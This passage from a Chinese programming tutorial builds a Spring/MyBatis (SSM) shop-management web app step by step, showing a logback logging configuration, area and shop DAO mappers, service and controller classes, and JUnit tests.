class="hljs-name">onMismatch</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-comment">&lt;!-- ERROR --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件滚动日志 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;errorAppender&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件路径 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">file</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.filePath&#125;</span><span class="language-xml">/error.log<span class="hljs-tag">&lt;/<span class="hljs-name">file</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 上面写满了，就使用下面的滚动文件 --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 基于时间滚动，按天 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件名称,在log.filePath路径下生产以 debug.日期.log.gz结尾的文件 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.filePath&#125;</span><span class="language-xml">/error/error.%d</span><span class="hljs-template-variable">&#123;yyyy-MM-dd&#125;</span><span class="language-xml">.log.gz<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件最大保存数量，轮询 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">maxHistory</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.maxHistory&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">maxHistory</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 将日志信息转化为字符串，将字符串输出到文件里 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.pattern&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 过滤器：过滤不是 debug.level的日志 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.classic.filter.LevelFilter&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>ERROR<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 如何时debug日志就记录下来 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">onMatch</span>&gt;</span>ACCEPT<span class="hljs-tag">&lt;/<span class="hljs-name">onMatch</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 如果不是debug日志就否定掉 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">onMismatch</span>&gt;</span>DENY<span class="hljs-tag">&lt;/<span class="hljs-name">onMismatch</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 告诉logback 需要关注那个包下面的信息 只记录那个日记级别的信息 additivity(将root日志的信息也放在这个 logger 里面来)  --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">logger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.imooc.o2o&quot;</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;log.level&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">additivity</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 绑定 appender, 往这个鞋appender输出信息 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;debugAppender&quot;</span>/&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;infoAppender&quot;</span>/&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;errorAppender&quot;</span>/&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">logger</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 根 root, 如果没有指定 level 会继承 root 的level --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 往下面的 consoleAppender 输出信息 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;consoleAppender&quot;</span>/&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><span class="language-xml">复制代码</span></code></pre><hr><h1 id="第四章-代码实现"><a href="#第四章-代码实现" class="headerlink" title="第四章 代码实现"></a>第四章 代码实现</h1><h2 id="4-1、简单的-SSM-案例-Area"><a href="#4-1、简单的-SSM-案例-Area" class="headerlink" title="4.1、简单的 SSM 案例-Area"></a>4.1、简单的 SSM 案例-Area</h2><h4 id="4-1-1、dao-层"><a href="#4-1-1、dao-层" class="headerlink" title="4.1.1、dao 层"></a>4.1.1、dao 层</h4><ol><li>在 dao 层创建一个 AreaDao 接口，代码如下</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.dao;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Area;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AreaDao</span> &#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 列出区域列表</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> areaList</span><span class="hljs-comment"> */</span>List&lt;Area&gt; <span class="hljs-title function_">queryArea</span><span class="hljs-params">()</span>;&#125;language-Java复制代码</code></pre><hr><ol><li>在 mapper 配置，创建 AreaDao.xml, 代码如下</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.AreaDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryArea&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Area&quot;</span>&gt;</span>SELECTarea_id,area_name,priority,create_time,last_edit_timeFROM tb_areaORDER BY priority DESC<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><hr><ol><li>dao 层单元测试，com.imooc.o2o.dao</li></ol><ul><li>BaseTest.java 基类，初始化 spring 的配置</li></ul><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o;<span class="hljs-keyword">import</span> org.junit.runner.RunWith;<span class="hljs-keyword">import</span> org.springframework.test.context.ContextConfiguration;<span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 初始化spring和junit整合，junit启动时加载springIOC容器</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> jxh</span><span class="hljs-comment"> */</span><span class="hljs-meta">@RunWith(SpringJUnit4ClassRunner.class)</span><span class="hljs-comment">// 告诉Junit spring配置文件的位置</span><span class="hljs-meta">@ContextConfiguration(&#123;&quot;classpath:spring/spring-dao.xml&quot;, &quot;classpath:spring/spring-service.xml&quot;&#125;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseTest</span> &#123;&#125;language-Java复制代码</code></pre><ul><li>测试类</li></ul><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.dao;<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.Assert.assertEquals;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> org.junit.Test;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> com.imooc.o2o.BaseTest;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Area;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AreaDaoTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> AreaDao areaDao;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testQueryArea</span><span class="hljs-params">()</span> &#123;List&lt;Area&gt; areaList = areaDao.queryArea();assertEquals(<span class="hljs-number">2</span>, areaList.size());&#125;&#125;language-Java复制代码</code></pre><hr><h4 id="4-1-2、Service-层"><a href="#4-1-2、Service-层" class="headerlink" title="4.1.2、Service 层"></a>4.1.2、Service 层</h4><ol><li>service AreaService.java 接口类</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.service;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Area;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AreaService</span> &#123;List&lt;Area&gt; <span class="hljs-title function_">getAreaList</span><span class="hljs-params">()</span>;&#125;language-Java复制代码</code></pre><ol><li>service.impl AreaServiceImpl.java 实现类</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.service.impi;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<span class="hljs-keyword">import</span> com.imooc.o2o.dao.AreaDao;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Area;<span class="hljs-keyword">import</span> com.imooc.o2o.service.AreaService;<span class="hljs-meta">@Service</span> <span class="hljs-comment">// Spring IOC 托管</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AreaServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AreaService</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> AreaDao areaDao;<span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> List&lt;Area&gt; <span class="hljs-title function_">getAreaList</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">// 从数据库取出数据</span><span class="hljs-keyword">return</span> areaDao.queryArea();&#125;&#125;language-Java复制代码</code></pre><ol><li>service 层单元测试</li></ol><ul><li>AreaServiceTest.java 代码</li></ul><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.service;<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.Assert.assertEquals;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> org.junit.Test;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> com.imooc.o2o.BaseTest;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Area;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AreaServiceTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> AreaService areaService;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetArealist</span><span class="hljs-params">()</span> &#123;List&lt;Area&gt; areaList = areaService.getAreaList();assertEquals(<span class="hljs-string">&quot;西苑&quot;</span>, areaList.get(<span class="hljs-number">0</span>).getAreaName());&#125;&#125;language-Java复制代码</code></pre><h4 id="4-1-3、web-层"><a href="#4-1-3、web-层" class="headerlink" title="4.1.3、web 层"></a>4.1.3、web 层</h4><ol><li>AreaController.java</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.web.superadmin;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Area;<span class="hljs-keyword">import</span> com.imooc.o2o.service.AreaService;<span class="hljs-meta">@Controller</span><span class="hljs-meta">@RequestMapping(&quot;/superadmin&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AreaController</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> AreaService areaService;<span class="hljs-meta">@RequestMapping(value = &quot;/listarea&quot;, method = RequestMethod.GET)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">listArea</span><span class="hljs-params">()</span> &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();List&lt;Area&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Area&gt;();<span class="hljs-keyword">try</span> &#123;list = areaService.getAreaList();modelMap.put(<span class="hljs-string">&quot;rows&quot;</span>, list);modelMap.put(<span class="hljs-string">&quot;total&quot;</span>, list.size());&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;e.printStackTrace();modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());&#125;<span class="hljs-keyword">return</span> modelMap;&#125;&#125;language-Java复制代码</code></pre><hr><hr><h1 id="第五章-店铺系统的实现"><a href="#第五章-店铺系统的实现" class="headerlink" title="第五章 店铺系统的实现"></a>第五章 店铺系统的实现</h1><h2 id="5-1、店铺的注册模块"><a href="#5-1、店铺的注册模块" class="headerlink" title="5.1、店铺的注册模块"></a>5.1、店铺的注册模块</h2><h4 id="5-1-1、dao-层代码"><a href="#5-1-1、dao-层代码" class="headerlink" title="5.1.1、dao 层代码"></a>5.1.1、dao 层代码</h4><ol><li>ShopDao.java 接口</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.dao;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ShopDao</span> &#123;<span class="hljs-comment">// 新增店铺，return 0 &amp; 1</span><span class="hljs-type">int</span> <span class="hljs-title function_">insertShop</span><span class="hljs-params">(Shop shop)</span>;<span class="hljs-comment">// 更新店铺信息</span><span class="hljs-type">int</span> <span class="hljs-title function_">updateShop</span><span class="hljs-params">(Shop shop)</span>;&#125;language-Java复制代码</code></pre><ol><li>mapper 的配置 ShopDao.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ShopDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 使用JDBC的getGeneratedKeys获取数据库自增主键值 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertShop&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">keyColumn</span>=<span class="hljs-string">&quot;shop_id&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;shopId&quot;</span>&gt;</span>INSERT INTOtb_shop(owner_id,area_id,shop_category_id,shop_name,shop_desc,shop_addr,phone,shop_img,priority,create_time,last_edit_time,enable_status,advice)VALUES(#&#123;owner.userId&#125;,#&#123;area.areaId&#125;,#&#123;shopCategory.shopCategoryId&#125;,#&#123;shopName&#125;,#&#123;shopDesc&#125;,#&#123;shopAddr&#125;,#&#123;phone&#125;,#&#123;shopImg&#125;,#&#123;priority&#125;,#&#123;createTime&#125;,#&#123;lastEditTime&#125;,#&#123;enableStatus&#125;,#&#123;advice&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><span class="hljs-comment">&lt;!-- Mybatis支持动态SQ, set标签里面是动态的SQL语句，<span class="hljs-doctag">xxx:</span>是实体类的成员变量; xxx_<span class="hljs-doctag">xxx:</span>数据库表中的字段名,例如&lt;if test=&quot;xxx != null&quot;&gt;xxx_xxx=#&#123;xxx&#125;&lt;/if&gt; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateShop&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Shop&quot;</span>&gt;</span>update tb_shop<span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;shopName != null&quot;</span>&gt;</span>shop_name=#&#123;shopName&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;shopDesc != null&quot;</span>&gt;</span>shop_desc=#&#123;shopDesc&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;shopAddr != null&quot;</span>&gt;</span>shop_addr=#&#123;shopAddr&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phone != null&quot;</span>&gt;</span>phone=#&#123;phone&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;shopImg != null&quot;</span>&gt;</span>shop_img=#&#123;shopImg&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;priority != null&quot;</span>&gt;</span>priority=#&#123;priority&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;lastEditTime != null&quot;</span>&gt;</span>last_edit_time=#&#123;lastEditTime&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;enableStatus != null&quot;</span>&gt;</span>enable_status=#&#123;enableStatus&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;advice != null&quot;</span>&gt;</span>advice=#&#123;advice&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;area != null&quot;</span>&gt;</span>area_id = #&#123;area.areaId&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;shopCategory != null&quot;</span>&gt;</span>shop_category_id=#&#123;shopCategory.shopCategoryId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span>where shop_id=#&#123;shopId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><ol><li>单元测试</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.dao;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShopDaoTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ShopDao shopDao;<span class="hljs-meta">@Test</span><span class="hljs-comment">// @Ignore // 忽略当前方法的测试</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testInsertShop</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();<span class="hljs-type">PersonInfo</span>  <span class="hljs-variable">owner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonInfo</span>();<span class="hljs-type">Area</span> <span class="hljs-variable">area</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Area</span>();<span class="hljs-type">ShopCategory</span> <span class="hljs-variable">shopCategory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopCategory</span>();<span class="hljs-comment">// 由于该shop涉及其他表，所以给其他表设置了一些测试值，现在初始化这些值，才可以正常的添加店铺</span>owner.setUserId(<span class="hljs-number">1L</span>);area.setAreaId(<span class="hljs-number">2</span>);shopCategory.setShopCategoryId(<span class="hljs-number">1L</span>);shop.setOwner(owner);shop.setArea(area);shop.setShopCategory(shopCategory);shop.setShopName(<span class="hljs-string">&quot;测试的店铺&quot;</span>);shop.setShopDesc(<span class="hljs-string">&quot;test&quot;</span>);shop.setShopAddr(<span class="hljs-string">&quot;test&quot;</span>);shop.setPhone(<span class="hljs-string">&quot;test&quot;</span>);shop.setShopImg(<span class="hljs-string">&quot;test&quot;</span>);shop.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());shop.setEnableStatus(<span class="hljs-number">1</span>);shop.setAdvice(<span class="hljs-string">&quot;审核中&quot;</span>);<span class="hljs-comment">// 影响行数</span><span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> shopDao.insertShop(shop);assertEquals(<span class="hljs-number">1</span>,effectedNum);&#125;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUpdateShop</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();<span class="hljs-comment">// 需要指定ID</span>shop.setShopId(<span class="hljs-number">1L</span>);<span class="hljs-type">PersonInfo</span>  <span class="hljs-variable">owner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonInfo</span>();<span class="hljs-type">Area</span> <span class="hljs-variable">area</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Area</span>();<span class="hljs-type">ShopCategory</span> <span class="hljs-variable">shopCategory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopCategory</span>();<span class="hljs-comment">// 由于该shop涉及其他表，所以给其他表设置了一些测试值，现在初始化这些值，才可以正常的添加店铺</span>owner.setUserId(<span class="hljs-number">1L</span>);area.setAreaId(<span class="hljs-number">2</span>);shop.setShopDesc(<span class="hljs-string">&quot;测试描述&quot;</span>);shop.setShopAddr(<span class="hljs-string">&quot;测试地址&quot;</span>);shop.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<span class="hljs-comment">// 影响行数</span><span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> shopDao.updateShop(shop);assertEquals(<span class="hljs-number">1</span>,effectedNum);&#125;&#125;language-Java复制代码</code></pre><h4 id="5-1-2、service-层代码"><a href="#5-1-2、service-层代码" class="headerlink" title="5.1.2、service 层代码"></a>5.1.2、service 层代码</h4><ol><li>ShopService 接口，定义操作方法和返回值</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.service;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> com.imooc.o2o.dto.ShopExecution;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Shop;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ShopService</span> &#123;ShopExecution <span class="hljs-title function_">addShop</span><span class="hljs-params">(Shop shop, File shopImg)</span>;&#125;language-Java复制代码</code></pre><ol><li>dto，对返回值进行二次封装，添加 status 等参数</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.dto;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShopExecution</span> &#123;<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> state; <span class="hljs-comment">// 结果状态</span><span class="hljs-keyword">private</span> String stateInfo; <span class="hljs-comment">// 状态标识,接受 state的说明</span><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count; <span class="hljs-comment">// 店铺数量</span><span class="hljs-keyword">private</span> Shop shop; <span class="hljs-comment">// 操作的shop (增删改店铺的时候用到)</span><span class="hljs-keyword">private</span> List&lt;Shop&gt; shopList; <span class="hljs-comment">// shop列表(查询店铺列表的时候使用)</span><span class="hljs-keyword">public</span> <span class="hljs-title function_">ShopExecution</span><span class="hljs-params">()</span> &#123;&#125;<span class="hljs-comment">// 店铺操作失败的时候使用的构造器</span><span class="hljs-keyword">public</span> <span class="hljs-title function_">ShopExecution</span><span class="hljs-params">(ShopStateEnum stateEnum)</span> &#123;<span class="hljs-built_in">this</span>.state = stateEnum.getState();<span class="hljs-built_in">this</span>.stateInfo = stateEnum.getStateInfo();&#125;<span class="hljs-comment">// 店铺操作成功时使用的构造器，同时返回单个shop</span><span class="hljs-keyword">public</span> <span class="hljs-title function_">ShopExecution</span><span class="hljs-params">(ShopStateEnum stateEnum, Shop shop)</span> &#123;<span class="hljs-built_in">this</span>.state = stateEnum.getState();<span class="hljs-built_in">this</span>.stateInfo = stateEnum.getStateInfo();<span class="hljs-built_in">this</span>.shop = shop;&#125;<span class="hljs-comment">// 